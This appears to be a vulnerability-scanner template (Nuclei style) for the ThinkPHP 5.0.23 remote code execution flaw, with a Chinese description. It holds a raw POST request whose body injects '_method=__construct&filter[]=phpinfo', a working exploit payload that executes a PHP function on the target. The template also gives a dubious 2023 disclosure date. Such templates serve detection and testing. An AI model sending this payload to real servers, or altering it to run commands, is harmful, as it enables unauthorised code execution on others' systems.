id: thinkphp5023_rce

info:
  name: ThinkPHP 5.0.23 远程代码执行漏洞
  author: 0dayPoc
  severity: high
  description: |-

    ThinkPHP 5.0.23 框架中存在远程代码执行漏洞，攻击者可通过构造恶意请求利用该漏洞在目标系统执行任意代码。该缺陷源于框架对用户输入数据的验证机制存在缺陷，导致攻击者能够绕过安全限制注入可执行代码。受影响组件为框架核心请求处理模块，成功利用可导致服务器端任意命令执行。此漏洞披露日期为2023年12月4日。
  tags: ThinkPHP

http:
- raw:
  - |
    POST /index.php?s=captcha HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'PHP Version'
